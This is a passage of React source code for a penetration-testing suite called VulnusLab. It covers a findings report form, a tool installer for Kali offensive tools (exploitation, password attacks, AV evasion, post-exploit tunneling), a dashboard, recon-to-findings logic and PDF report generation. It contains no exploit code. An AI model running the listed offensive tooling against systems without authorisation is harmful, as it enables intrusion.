          {[["Report Title",title,setTitle],["Client / Company",client,setClient],["Tester Name",tester,setTester],["Target System",target,setTarget]].map(([lbl,val,set])=>(
            <div key={lbl}>
              <div style={{color:"#94a3b8",fontSize:11,marginBottom:4}}>{lbl}</div>
              <input value={val} onChange={e=>set(e.target.value)} style={{width:"100%",background:"#020617",border:"1px solid #334155",borderRadius:6,padding:"8px 10px",color:"#e2e8f0",fontSize:13,outline:"none",boxSizing:"border-box"}}/>
            </div>
          ))}
        </div>
        <div style={{marginTop:10}}>
          <div style={{color:"#94a3b8",fontSize:11,marginBottom:4}}>Executive Summary</div>
          <textarea value={exec} onChange={e=>setExec(e.target.value)} rows={4} placeholder="Summarise the engagement scope, key risks, and recommendations..."
            style={{width:"100%",background:"#020617",border:"1px solid #334155",borderRadius:6,padding:"8px 10px",color:"#e2e8f0",fontSize:13,outline:"none",resize:"vertical",boxSizing:"border-box"}}/>
        </div>
      </div>

      {/* Risk overview */}
      <div style={{display:"flex",flexDirection:"column",gap:8}}>
        {SEVS.map(s=>({ s, n:findings.filter(f=>f.severity===s).length })).map(({s,n})=>(
          <div key={s} style={{background:"#0a1628",border:`1px solid ${sev[s]}33`,borderRadius:8,padding:"10px",textAlign:"center"}}>
            <div style={{fontSize:20,fontWeight:800,color:sev[s]}}>{n}</div>
            <div style={{fontSize:10,color:"#94a3b8",fontWeight:700}}>{s}</div>
          </div>
        ))}
      </div>

      {/* Findings list */}
      <div style={{background:"#0a1628",border:"1px solid #1e293b",borderRadius:10,padding:18,marginBottom:16}}>
        <div style={{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:14}}>
          <span style={{color:"#60a5fa",fontWeight:700,fontSize:12,letterSpacing:1}}>FINDINGS ({findings.length})</span>
          <button onClick={addFinding} style={{background:"#1d4ed8",border:"none",borderRadius:6,padding:"7px 16px",color:"#fff",fontSize:12,fontWeight:700,cursor:"pointer"}}>+ Add Finding</button>
        </div>
        {findings.length===0 && <div style={{color:"#475569",fontSize:13,textAlign:"center",padding:"24px 0"}}>No findings yet — click "Add Finding" to start</div>}
        {findings.map((f,i)=>(
          <div key={i} style={{background:"#020617",border:`1px solid ${sev[f.severity]||"#334155"}44`,borderRadius:8,padding:14,marginBottom:10}}>
            <div style={{display:"flex",gap:8,marginBottom:10,alignItems:"center"}}>
              <input value={f.title} onChange={e=>updF(i,"title",e.target.value)} placeholder="Finding title (e.g. SQL Injection in login form)"
                style={{flex:1,background:"#0a1628",border:"1px solid #334155",borderRadius:6,padding:"7px 10px",color:"#e2e8f0",fontSize:13,outline:"none"}}/>
              <select value={f.severity} onChange={e=>updF(i,"severity",e.target.value)}
                style={{background:"#0a1628",border:`1px solid ${sev[f.severity]}`,borderRadius:6,padding:"7px 10px",color:sev[f.severity],fontSize:12,fontWeight:700,outline:"none"}}>
                {SEVS.map(s=><option key={s} value={s}>{s}</option>)}
              </select>
              <button onClick={()=>delF(i)} style={{background:"#7f1d1d",border:"none",borderRadius:6,padding:"7px 12px",color:"#fca5a5",fontSize:12,cursor:"pointer"}}>✕</button>
            </div>
            <textarea value={f.desc} onChange={e=>updF(i,"desc",e.target.value)} rows={2} placeholder="Description — what was found, how to reproduce..."
              style={{width:"100%",background:"#0a1628",border:"1px solid #1e293b",borderRadius:6,padding:"7px 10px",color:"#cbd5e1",fontSize:12,outline:"none",resize:"vertical",marginBottom:6,boxSizing:"border-box"}}/>
            <textarea value={f.remediation} onChange={e=>updF(i,"remediation",e.target.value)} rows={1} placeholder="Remediation recommendation..."
              style={{width:"100%",background:"#0a1628",border:"1px solid #14532d",borderRadius:6,padding:"7px 10px",color:"#86efac",fontSize:12,outline:"none",resize:"vertical",boxSizing:"border-box"}}/>
          </div>
        ))}
      </div>

      <button onClick={exportPDF} style={{background:"#ef4444",border:"none",borderRadius:6,padding:"8px 18px",color:"#fff",fontSize:13,fontWeight:700,cursor:"pointer"}}>
        📄 Report
      </button>
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════
//  TOOL MANAGER
// ═══════════════════════════════════════════════════════════════
function ToolManagerModule({token}) {
  const [log,    setLog]    = useState([]);
  const [running,setRunning]= useState(false);
  const [status, setStatus] = useState({});
  const apiUrl = getApiUrl();

  const TOOLS = [
    {cat:"System Update",    tools:["kali-update","apt-upgrade"]},
    {cat:"Recon & OSINT",    tools:["nmap","masscan","amass","subfinder","theHarvester","recon-ng","spiderfoot","sherlock","dnsrecon","dnsx","httpx","waybackurls","wafw00f","whatweb"]},
    {cat:"Web Testing",      tools:["nikto","gobuster","ffuf","feroxbuster","sqlmap","nuclei","dalfox","arjun","wfuzz","sublist3r","wpscan","dirb"]},
    {cat:"Exploitation",     tools:["metasploit-framework","searchsploit","msfvenom","crackmapexec","evil-winrm","impacket"]},
    {cat:"Password Attacks", tools:["hashcat","john","hydra","medusa","wordlists"]},
    {cat:"Active Directory", tools:["bloodhound","neo4j","kerbrute","responder","ldapdomaindump"]},
    {cat:"Wireless",         tools:["aircrack-ng","wifite","hostapd","kismet","bettercap"]},
    {cat:"Post Exploit",     tools:["linpeas","winpeas","pspy","pwncat","chisel","ligolo-ng","socat"]},
    {cat:"AV Evasion",       tools:["veil","shellter","msfvenom","unicorn"]},
    {cat:"Tunneling",        tools:["chisel","ligolo-ng","proxychains4","sshuttle","socat"]},
    {cat:"Mobile",           tools:["apktool","jadx","adb","frida-tools","objection","androguard"]},
    {cat:"Binary Exploit",   tools:["pwntools","gdb","pwndbg","gef","ropper","ROPgadget","peda","checksec"]},
    {cat:"Forensics",        tools:["binwalk","foremost","volatility3","exiftool","strings","yara"]},
    {cat:"GitHub Tools",     tools:["trufflehog","gitleaks","semgrep","pspy","peass-ng"]},
  ];

  const add = msg => setLog(p=>[...p, msg]);

  const checkStatus = async () => {
    try {
      const res = await fetch(`${apiUrl}/api/tools/status`, {
        method:"POST", headers:{"Content-Type":"application/json","Authorization":`Bearer ${token || getAuthToken()}`},
        body: JSON.stringify({})
      });
      const d = await res.json();
      setStatus(d.status || {});
    } catch(e) { add("❌ Cannot reach backend"); }
  };

  const runInstall = async (mode) => {
    setRunning(true); setLog([`🚀 Starting: ${mode}...`]);
    try {
      const res = await fetch(`${apiUrl}/api/tools/install`, {
        method:"POST", headers:{"Content-Type":"application/json","Authorization":`Bearer ${token || getAuthToken()}`},
        body: JSON.stringify({mode})
      });
      const d = await res.json();
      (d.log||[]).forEach(l=>add(l));
      add(d.error ? `❌ ${d.error}` : `✅ Done — ${d.installed||0} tools processed`);
    } catch(e) { add(`❌ ${e.message}`); }
    setRunning(false);
  };

  useEffect(()=>{ checkStatus(); },[]);

  const sevColor = s => s==="ok"?"#22c55e":s==="missing"?"#ef4444":"#f59e0b";

  return (
    <div style={{padding:24,maxWidth:1000,margin:"0 auto"}}>
      <div style={{marginBottom:20,display:"flex",justifyContent:"space-between",alignItems:"flex-start"}}>
        <div>
          <h2 style={{color:"#e2e8f0",margin:0,fontSize:22,fontWeight:800}}>🛠️ Tool Manager & Updater</h2>
          <p style={{color:"#64748b",fontSize:13,marginTop:4}}>Update Kali, install/upgrade all pentesting tools including GitHub projects</p>
        </div>
        <button onClick={checkStatus} style={{background:"#1e293b",border:"1px solid #334155",borderRadius:6,padding:"8px 16px",color:"#94a3b8",fontSize:12,cursor:"pointer"}}>
          🔄 Check Status
        </button>
      </div>

      {/* Action Buttons */}
      <div style={{display:"grid",gridTemplateColumns:"1fr 1fr 1fr 1fr",gap:10,marginBottom:20}}>
        {[
          {label:"Update Kali Linux",   icon:"🐉", mode:"update",   color:"#1d4ed8", desc:"apt update + upgrade"},
          {label:"Install All Tools",   icon:"📦", mode:"all",      color:"#15803d", desc:"All categories below"},
          {label:"GitHub Tools Only",   icon:"🐙", mode:"github",   color:"#7c3aed", desc:"Clone & build from GitHub"},
          {label:"Update Existing",     icon:"⬆️", mode:"upgrade",  color:"#b45309", desc:"Upgrade installed tools"},
        ].map(b=>(
          <button key={b.mode} onClick={()=>runInstall(b.mode)} disabled={running}
            style={{background:b.color+"22",border:`1px solid ${b.color}66`,borderRadius:10,padding:"14px 10px",
              cursor:running?"not-allowed":"pointer",textAlign:"center",opacity:running?0.6:1}}>
            <div style={{fontSize:24,marginBottom:6}}>{b.icon}</div>
            <div style={{color:"#e2e8f0",fontSize:12,fontWeight:700}}>{b.label}</div>
            <div style={{color:"#64748b",fontSize:10,marginTop:3}}>{b.desc}</div>
          </button>
        ))}
      </div>

      {/* Tool Status Grid */}
      {Object.keys(status).length > 0 && (
        <div style={{background:"#0a1628",border:"1px solid #1e293b",borderRadius:10,padding:16,marginBottom:16}}>
          <div style={{color:"#60a5fa",fontWeight:700,fontSize:12,marginBottom:12,letterSpacing:1}}>TOOL STATUS</div>
          <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fill,minmax(160px,1fr))",gap:6}}>
            {Object.entries(status).map(([tool,s])=>(
              <div key={tool} style={{display:"flex",alignItems:"center",gap:6,background:"#020617",borderRadius:6,padding:"5px 8px"}}>
                <div style={{width:7,height:7,borderRadius:"50%",background:sevColor(s),flexShrink:0}}/>
                <span style={{color:"#cbd5e1",fontSize:11,fontFamily:"monospace"}}>{tool}</span>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Tool Categories */}
      <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:10,marginBottom:16}}>
        {TOOLS.map(cat=>(
          <div key={cat.cat} style={{background:"#0a1628",border:"1px solid #1e293b",borderRadius:8,padding:12}}>
            <div style={{color:"#60a5fa",fontSize:11,fontWeight:700,marginBottom:8}}>{cat.cat}</div>
            <div style={{display:"flex",flexWrap:"wrap",gap:4}}>
              {cat.tools.map(t=>(
                <span key={t} style={{background:status[t]==="ok"?"#14532d":status[t]==="missing"?"#450a0a":"#1e293b",
                  color:status[t]==="ok"?"#86efac":status[t]==="missing"?"#fca5a5":"#94a3b8",
                  padding:"2px 7px",borderRadius:4,fontSize:10,fontFamily:"monospace"}}>
                  {status[t]==="ok"?"✓ ":status[t]==="missing"?"✗ ":""}{t}
                </span>
              ))}
            </div>
          </div>
        ))}
      </div>

      {/* Log Output */}
      {log.length > 0 && (
        <div style={{background:"#020617",border:"1px solid #1e293b",borderRadius:10,padding:16}}>
          <div style={{display:"flex",justifyContent:"space-between",marginBottom:10}}>
            <span style={{color:"#60a5fa",fontWeight:700,fontSize:12}}>INSTALL LOG</span>
            <button onClick={()=>setLog([])} style={{background:"none",border:"none",color:"#475569",fontSize:11,cursor:"pointer"}}>✕ Clear</button>
          </div>
          <div style={{maxHeight:300,overflowY:"auto",fontFamily:"monospace",fontSize:11}}>
            {log.map((l,i)=>(
              <div key={i} style={{color:l.startsWith("❌")?"#ef4444":l.startsWith("✅")?"#22c55e":l.startsWith("🔄")?"#60a5fa":"#94a3b8",marginBottom:2,lineHeight:1.5}}>{l}</div>
            ))}
            {running && <div style={{color:"#60a5fa",animation:"pulse 1s infinite"}}>▌ Running...</div>}
          </div>
        </div>
      )}
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════
//  DASHBOARD
// ═══════════════════════════════════════════════════════════════
function Dashboard(props) {
  const token = props.token;
  const [stats,setStats]   = useState(null);
  const [health,setHealth] = useState(null);

  useEffect(()=>{
    api("/api/health",  "GET",null,token).then(d=>setHealth(d)).catch(()=>{});
    api("/api/scans",   "GET",null,token).then(d=>setStats(d)).catch(()=>{});
  },[token]);

  const cards = [
    {label:"Total Scans",    val:stats?.total||0,         icon:"📊", color:"#3b82f6"},
    {label:"Tools Available",val:health?Object.keys(health.free_tools||{}).length:0, icon:"🛠", color:"#22c55e"},
    {label:"Modules",        val:20,                       icon:"🧩", color:"#a855f7"},
    {label:"Platform Version",val:"v3.1",                  icon:"🚀", color:"#f59e0b"},
  ];

  const recentScans = stats?.scans?.slice(-5).reverse() || [];
  const freeTools   = health ? Object.entries(health.free_tools||{}) : [];
  const available   = freeTools.filter(([,v])=>v.available).length;

  return (
    <div className="fade">
      {/* Welcome */}
      <div style={{background:"linear-gradient(135deg,#0c1a3d,#0f172a)",border:"1px solid #1e3a8a",borderRadius:10,padding:"20px 24px",marginBottom:20,display:"flex",alignItems:"center",gap:16}}>
        <div style={{fontSize:40}}>🛡️</div>
        <div>
          <h1 style={{fontSize:20,fontWeight:700,color:"#f1f5f9",margin:"0 0 2px"}}>Welcome to VulnusLab v3.1</h1>
          <p style={{fontSize:12,color:"#64748b",margin:0}}>Production Penetration Testing Suite — {new Date().toLocaleDateString('en-GB',{weekday:'long',day:'2-digit',month:'long',year:'numeric'})}</p>
        </div>
        <div style={{marginLeft:"auto",textAlign:"right"}}>
          <div style={{fontSize:11,color:"#22c55e",fontWeight:600}}>● System Online</div>
          <div style={{fontSize:10,color:"#475569"}}>Kali Linux Backend</div>
        </div>
      </div>

      {/* Stats cards */}
      <div style={{display:"grid",gridTemplateColumns:"repeat(4,1fr)",gap:12,marginBottom:20}}>
        {cards.map((c,i)=>(
          <div key={i} style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:8,padding:16,borderTop:`3px solid ${c.color}`}}>
            <div style={{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:8}}>
              <span style={{fontSize:22}}>{c.icon}</span>
              <span style={{fontSize:10,color:c.color,fontWeight:700,background:c.color+"20",padding:"2px 8px",borderRadius:4}}>LIVE</span>
            </div>
            <div style={{fontSize:28,fontWeight:700,color:c.color,marginBottom:2}}>{c.val}</div>
            <div style={{fontSize:11,color:"#64748b"}}>{c.label}</div>
          </div>
        ))}
      </div>

      <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:16,marginBottom:20}}>
        {/* Recent Scans */}
        <div style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:8,overflow:"hidden"}}>
          <div style={{padding:"12px 16px",borderBottom:"1px solid #1e293b",display:"flex",justifyContent:"space-between",alignItems:"center"}}>
            <span style={{fontSize:13,fontWeight:600,color:"#f1f5f9"}}>📋 Recent Scans</span>
            <span style={{fontSize:10,color:"#475569"}}>{stats?.total||0} total</span>
          </div>
          {recentScans.length>0 ? recentScans.map((s,i)=>(
            <div key={i} style={{padding:"10px 16px",borderBottom:"1px solid #0f172a",background:i%2===0?"#020617":"transparent",display:"flex",alignItems:"center",gap:10}}>
              <span style={{fontSize:11,color:"#3b82f6",fontFamily:"monospace",fontWeight:600,minWidth:80}}>{s.tool}</span>
              <span style={{fontSize:10,color:"#64748b",fontFamily:"monospace",flex:1,overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>{s.target}</span>
              <span style={{fontSize:9,background:s.status==="complete"?"#052e16":"#1c0a0a",color:s.status==="complete"?"#22c55e":"#ef4444",padding:"2px 6px",borderRadius:3,fontWeight:600}}>{s.status}</span>
            </div>
          )) : <div style={{padding:24,textAlign:"center",color:"#334155",fontSize:12}}>No scans yet — run your first scan!</div>}
        </div>

        {/* Tools Status */}
        <div style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:8,overflow:"hidden"}}>
          <div style={{padding:"12px 16px",borderBottom:"1px solid #1e293b",display:"flex",justifyContent:"space-between",alignItems:"center"}}>
            <span style={{fontSize:13,fontWeight:600,color:"#f1f5f9"}}>🛠 Tools Status</span>
            <span style={{fontSize:10,color:"#22c55e",fontWeight:600}}>{available}/{freeTools.length} available</span>
          </div>
          <div style={{maxHeight:200,overflowY:"auto"}}>
            {freeTools.slice(0,12).map(([name,info],i)=>(
              <div key={i} style={{padding:"7px 16px",borderBottom:"1px solid #0f172a",background:i%2===0?"#020617":"transparent",display:"flex",alignItems:"center",gap:8}}>
                <div style={{width:6,height:6,borderRadius:"50%",background:info.available?"#22c55e":"#ef4444",flexShrink:0}}/>
                <span style={{fontSize:11,color:"#e2e8f0",fontFamily:"monospace",flex:1}}>{name}</span>
                <span style={{fontSize:9,color:info.available?"#22c55e":"#ef4444"}}>{info.available?"OK":"MISSING"}</span>
              </div>
            ))}
          </div>
        </div>
      </div>

      {/* Quick Launch */}
      <div style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:8,padding:16}}>
        <div style={{fontSize:13,fontWeight:600,color:"#f1f5f9",marginBottom:12}}>⚡ Quick Launch</div>
        <div style={{display:"grid",gridTemplateColumns:"repeat(4,1fr)",gap:8}}>
          {[
            {label:"Web App Pentest",  icon:"🌐", mod:"webapp",  color:"#3b82f6"},
            {label:"Recon & OSINT",    icon:"🔍", mod:"recon",   color:"#22c55e"},
            {label:"Vuln Scanning",    icon:"🛡️", mod:"vuln",    color:"#f59e0b"},
            {label:"Password Attacks", icon:"🔑", mod:"password",color:"#a855f7"},
          ].map((q,i)=>(
            <button key={i} onClick={()=>props.setActive(q.mod)}
              style={{background:"#020617",border:`1px solid ${q.color}30`,borderRadius:6,padding:"12px 8px",cursor:"pointer",textAlign:"center",transition:"all .2s"}}
              onMouseOver={e=>e.currentTarget.style.background=q.color+"15"}
              onMouseOut={e=>e.currentTarget.style.background="#020617"}>
              <div style={{fontSize:22,marginBottom:6}}>{q.icon}</div>
              <div style={{fontSize:11,color:"#94a3b8",fontWeight:500}}>{q.label}</div>
            </button>
          ))}
        </div>
      </div>
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════
//  RECON FINDINGS SYNTHESIS
// ═══════════════════════════════════════════════════════════════
function synthesizeReconFindings(r) {
  r = r || {};
  const findings = [];
  if (r.cve_match && r.cve_match.cves && r.cve_match.cves.length > 0) {
    const services = r.cve_match.services_detected || [];
    services.forEach(svc => {
      const svcKey = svc.vendor + "/" + svc.product;
      const svcCves = r.cve_match.cves.filter(c => c.vendor_product === svcKey);
      const critical = svcCves.filter(c => c.cvss_severity === "CRITICAL");
      const high     = svcCves.filter(c => c.cvss_severity === "HIGH");
      if (critical.length > 0) {
        findings.push({
          title: "Outdated " + svc.product + " " + svc.version + " - " + critical.length + " CRITICAL CVE(s)",
          severity: "CRITICAL", category: "Outdated Software",
          description: svc.vendor + "/" + svc.product + " " + svc.version + " has " + critical.length + " CRITICAL CVE(s). Top: " + critical.slice(0,3).map(c => c.id + " (CVSS " + c.cvss_score + ")").join(", "),
          evidence: svc.detected_in || (svc.vendor + "/" + svc.product + " " + svc.version),
          remediation: "Upgrade " + svc.product + " to the latest stable version.",
          references: critical.slice(0,5).map(c => c.id).join(", "),
          cvss: critical[0].cvss_score || 9.0,
        });
      }
      if (high.length > 0) {
        findings.push({
          title: "Outdated " + svc.product + " " + svc.version + " - " + high.length + " HIGH CVE(s)",
          severity: "HIGH", category: "Outdated Software",
          description: svc.vendor + "/" + svc.product + " " + svc.version + " has " + high.length + " HIGH CVE(s). Top: " + high.slice(0,3).map(c => c.id + " (CVSS " + c.cvss_score + ")").join(", "),
          evidence: svc.detected_in || (svc.vendor + "/" + svc.product + " " + svc.version),
          remediation: "Upgrade " + svc.product + " to the latest stable version.",
          references: high.slice(0,5).map(c => c.id).join(", "),
          cvss: high[0].cvss_score || 7.5,
        });
      }
    });
  }
  if (r.whois && r.whois.expires) {
    const exp = new Date(r.whois.expires);
    if (!isNaN(exp.getTime())) {
      const days = Math.floor((exp - new Date()) / 86400000);
      if (days < 0) {
        findings.push({title:"Domain expired " + Math.abs(days) + " days ago",severity:"CRITICAL",category:"Domain Ownership",description:(r.whois.domain || "Target") + " expired on " + r.whois.expires + ".",evidence:"WHOIS: expires=" + r.whois.expires,remediation:"Renew the domain immediately.",references:"CWE-298",cvss:9.0});
      } else if (days <= 30) {
        findings.push({title:"Domain expires in " + days + " days",severity:"HIGH",category:"Domain Ownership",description:r.whois.domain + " expires on " + r.whois.expires + " - renewal urgent.",evidence:"WHOIS: expires=" + r.whois.expires,remediation:"Renew within two weeks.",references:"CWE-298",cvss:7.5});
      } else if (days <= 90) {
        findings.push({title:"Domain expires in " + days + " days",severity:"MEDIUM",category:"Domain Ownership",description:r.whois.domain + " expires on " + r.whois.expires + ".",evidence:"WHOIS: expires=" + r.whois.expires,remediation:"Schedule the renewal.",cvss:5.0});
      }
    }
  }
  if (r.dns && r.dns.records) {
    const recs = r.dns.records;
    let txtRecs = [];
    if (Array.isArray(recs)) { txtRecs = recs.filter(x => (x.type||"").toUpperCase() === "TXT").map(x => x.value || x.address || ""); }
    else if (typeof recs === "object") { txtRecs = (recs.TXT || []).map(x => typeof x === "string" ? x : String(x)); }
    const hasSpf = txtRecs.some(t => String(t).toLowerCase().includes("v=spf1"));
    if (!hasSpf && txtRecs.length > 0) {
      findings.push({title:"No SPF record published",severity:"HIGH",category:"Email Security",description:"Domain has no SPF record. Email can be spoofed.",evidence:txtRecs.length + " TXT records, none contain v=spf1",remediation:"Publish 'v=spf1 mx -all' TXT record.",references:"CWE-290, OWASP A07:2021",cvss:7.0});
    } else if (hasSpf) {
      const spf = txtRecs.find(t => String(t).toLowerCase().includes("v=spf1"));
      if (spf && !spf.includes("-all") && !spf.includes("~all")) {
        findings.push({title:"SPF record uses weak policy",severity:"MEDIUM",category:"Email Security",description:"SPF exists but no -all/~all.",evidence:"spf=" + String(spf).substring(0,120),remediation:"Tighten to '-all' or '~all'.",references:"CWE-290",cvss:5.0});
      }
    }
  }
  const allPorts = new Set();
  ((r.masscan && r.masscan.ports) || []).forEach(p => allPorts.add(p.port));
  ((r.nmap    && r.nmap.ports)    || []).forEach(p => allPorts.add(p.port));
  const dangerous = {
    23:["Telnet","CRITICAL","Cleartext remote-admin exposed",9.5,"CWE-319"],
    21:["FTP","HIGH","Cleartext file transfer",7.5,"CWE-319"],
    1433:["MSSQL","CRITICAL","Database directly exposed",9.0,"CWE-668"],
    3306:["MySQL","CRITICAL","Database directly exposed",9.0,"CWE-668"],
    5432:["PostgreSQL","CRITICAL","Database directly exposed",9.0,"CWE-668"],
    27017:["MongoDB","CRITICAL","Database exposed",9.5,"CWE-668"],
    6379:["Redis","CRITICAL","Cache exposed",9.5,"CWE-668"],
    9200:["Elasticsearch","CRITICAL","Search engine exposed",9.5,"CWE-668"],
    11211:["Memcached","CRITICAL","Cache exposed",8.5,"CWE-668"],
    5984:["CouchDB","CRITICAL","Database exposed",9.0,"CWE-668"],
    2375:["Docker API","CRITICAL","Docker daemon exposed",9.8,"CWE-306"],
    2376:["Docker API","CRITICAL","Docker daemon (TLS) exposed",9.0,"CWE-306"],
    445:["SMB","HIGH","File-sharing exposed",8.0,"CWE-200"],
    139:["NetBIOS","HIGH","Windows file-sharing exposed",7.5,"CWE-200"],
    3389:["RDP","HIGH","Remote desktop exposed",7.5,"CWE-200"],
    5900:["VNC","HIGH","VNC exposed",7.5,"CWE-306"],
    5601:["Kibana","HIGH","Kibana UI exposed",7.0,"CWE-200"],
    15672:["RabbitMQ","HIGH","RabbitMQ UI exposed",7.0,"CWE-200"],
  };
  allPorts.forEach(port => {
    if (dangerous[port]) {
      const [name, sev, why, cvss, cwe] = dangerous[port];
      findings.push({title:name + " exposed on port " + port + "/tcp",severity:sev,category:"Exposed Service",description:why,evidence:"Port " + port + "/tcp confirmed open",remediation:"Bind " + name + " to localhost or restrict via firewall/VPN.",references:cwe + ", OWASP A05:2021",cvss:cvss});
    }
  });
  if (allPorts.has(80) && !allPorts.has(443)) {
    findings.push({title:"HTTP exposed without HTTPS",severity:"MEDIUM",category:"Encryption",description:"Port 80 open, port 443 not detected. Traffic unencrypted.",evidence:"Port 80 open, port 443 not detected",remediation:"Deploy TLS (Let's Encrypt), redirect HTTP to HTTPS.",references:"CWE-319, OWASP A02:2021",cvss:5.5});
  }
  const sevOrder = { CRITICAL: 0, HIGH: 1, MEDIUM: 2, LOW: 3, INFO: 4 };
  findings.sort((a, b) => {
    const sa = sevOrder[a.severity] !== undefined ? sevOrder[a.severity] : 5;
    const sb = sevOrder[b.severity] !== undefined ? sevOrder[b.severity] : 5;
    if (sa !== sb) return sa - sb;
    return (b.cvss || 0) - (a.cvss || 0);
  });
  return findings;
}

// ═══════════════════════════════════════════════════════════════
//  RECON PDF REPORT
// ═══════════════════════════════════════════════════════════════
function generateReconReport({target, allResults, date}) {
  const r = allResults || {};
  const _doGen = () => {
  const doc    = new jsPDF({unit:"mm",format:"a4"});
  const pageW  = 210, pageH = 297, margin = 12, contentW = pageW - margin*2;
  const BLUE   = [59,130,246], DARK = [15,23,42], GRAY = [100,116,139];
  const LIGHT  = [241,245,249], WHITE = [255,255,255], BORDER = [203,213,225];
  const LBLUE  = [220,230,245];
  let y = 18; let _secN = 0;

  const fillR  = (x,yy,w,h,c) => { doc.setFillColor(...c); doc.rect(x,yy,w,h,"F"); };
  const rrect  = (x,yy,w,h,r2,c) => { doc.setFillColor(...c); doc.roundedRect(x,yy,w,h,r2,r2,"F"); };
  const txt    = (t,x,yy,sz,c,bold,align) => { doc.setFont("Arial",bold?"bold":"normal"); doc.setFontSize(sz||10); doc.setTextColor(...(c||DARK)); doc.text(String(t),x,yy,{align:align||"left"}); };
  const chk    = n => { if(y+n>278){ doc.addPage(); y=18; drawHeader(); } };
  const sHead  = (title,yy) => { _secN++; fillR(margin,yy,contentW,9,LBLUE); txt(_secN+". "+title,margin+4,yy+6.2,10,BLUE,true); return yy+13; };
  const tHead  = (cols,widths,yy) => { fillR(margin,yy,contentW,8,DARK); let cx=margin+3; cols.forEach((c,i)=>{ txt(c,cx,yy+5.5,8,WHITE,true); cx+=widths[i]; }); return yy+8; };
  const drawHeader = () => { txt("VulnusLab — Recon Report",margin,10,7,GRAY); txt(date,pageW-margin,10,7,BLUE,false,"right"); };

  // ── COVER ──────────────────────────────────────────────────
  fillR(0,0,pageW,64,DARK);
  // VulnusLab shield logo + wordmark (top-center)
  {
    const sx = pageW/2, sy = 16, w = 12, h = 14;
    doc.setFillColor(15,23,42);
    doc.setDrawColor(59,130,246); doc.setLineWidth(0.6);
    doc.lines([
      [w*0.45,0],[w*0.55,h*0.15],[0,h*0.5],
      [-w*0.55,h*0.5],[-w*0.45,-h*0.15],[-w*0.45,-h*0.4],
      [0,-h*0.1],[w*0.45,-h*0.4],[0,h*0.4]
    ], sx-w*0.45, sy-h*0.4, [1,1], 'FD');
    doc.setFont("helvetica","bold"); doc.setFontSize(10); doc.setTextColor(59,130,246);
    doc.text("V", sx, sy + 1, {align:"center"});
    doc.setFont("helvetica","bold"); doc.setFontSize(7);
    doc.setTextColor(241,245,249);
    doc.text("VULNUS", sx - 1, sy + 10, {align:"right"});
    doc.setTextColor(59,130,246);
    doc.text("LAB", sx, sy + 10, {align:"left"});
  }
  doc.setFont("Arial","bold"); doc.setFontSize(20); doc.setTextColor(...BLUE);
  doc.text("RECON REPORT",pageW/2,38,{align:"center"});
  doc.setFont("Arial","normal"); doc.setFontSize(10); doc.setTextColor(...GRAY);
  doc.text("Information Gathering & OSINT",pageW/2,46,{align:"center"});
  y = 74;

  // Info table
  fillR(margin,y,contentW,8,DARK); txt("FIELD",margin+3,y+5.5,8,WHITE,true); txt("VALUE",margin+55,y+5.5,8,WHITE,true); y+=8;
  [["Target",target],["Scan Date",date],["Classification","CONFIDENTIAL"],["Report Type","Reconnaissance Assessment"]].forEach((row,i)=>{
    fillR(margin,y,contentW,8,i%2===0?LIGHT:WHITE);
    txt(row[0],margin+3,y+5.5,8.5,GRAY,true); txt(String(row[1]),margin+55,y+5.5,8.5,DARK); y+=8;
  });
  y+=10;

  // ─── SCAN COVERAGE ───────────────────────────────────────────
  // Every recon report MUST account for every phase. Three states:
  //   RAN        — tool returned data
  //   EMPTY      — tool ran cleanly but found nothing (still success)
  //   FAILED     — tool errored; reason shown
  //   NOT RUN    — phase tile was deselected before scan started
  // Eliminates the "DNS missing — why?" question customers shouldn't
  // need to ask. If a section is absent from this PDF, this table tells
  // them WHY.
  const _PHASE_DEFS = [
    {tool:"whois",       name:"WHOIS Lookup",          isEmpty:d=>!d.registrar && !d.raw_output},
    {tool:"dns",         name:"DNS Records",           isEmpty:d=>!d.records || (Array.isArray(d.records) ? d.records.length===0 : Object.keys(d.records).length===0)},
    {tool:"dnsrecon",    name:"DNS Recon",             isEmpty:d=>!d.records || d.records.length===0},
    {tool:"subdomains",  name:"Subdomain Discovery",   isEmpty:d=>!d.subdomains || d.subdomains.length===0},
    {tool:"crtsh",       name:"Cert Transparency",     isEmpty:d=>!d.subdomains || d.subdomains.length===0},
    {tool:"amass",       name:"Deep Subdomain (amass)",isEmpty:d=>!d.subdomains || d.subdomains.length===0},
    {tool:"harvester",   name:"OSINT Harvesting",      isEmpty:d=>(!d.emails||d.emails.length===0) && (!d.hosts||d.hosts.length===0)},
    {tool:"shodan",      name:"Shodan Lookup",         isEmpty:d=>!d.ports || d.ports.length===0},
    {tool:"masscan",     name:"Fast Port Scan",        isEmpty:d=>!d.ports || d.ports.length===0},
    {tool:"nmap",        name:"Deep Port Scan",        isEmpty:d=>!d.ports || d.ports.length===0},
    {tool:"services",    name:"Service Detection",     isEmpty:d=>!d.ports || d.ports.length===0},
    {tool:"os",          name:"OS Fingerprinting",     isEmpty:d=>!d.os && !d.os_match},
    {tool:"banner",      name:"Banner Grabbing",       isEmpty:d=>!d.banners || Object.keys(d.banners).length===0},
    {tool:"gobuster",    name:"Directory Enumeration", isEmpty:d=>!d.found || d.found.length===0},
    {tool:"jsendpoints", name:"JS Endpoint Extractor", isEmpty:d=>(!d.paths||d.paths.length===0) && (!d.discovered||d.discovered.length===0)},
    {tool:"wayback",     name:"Wayback Machine",       isEmpty:d=>(d.total||0)===0},
    {tool:"robotsmap",   name:"robots + sitemap",      isEmpty:d=>(d.total||0)===0},
    {tool:"crawl",       name:"BFS Crawler",           isEmpty:d=>(d.total||0)===0},
    {tool:"params",      name:"Parameter Discovery",   isEmpty:d=>!d.params || d.params.length===0},
    {tool:"favicon",     name:"Favicon Fingerprint",   isEmpty:d=>!d.found},
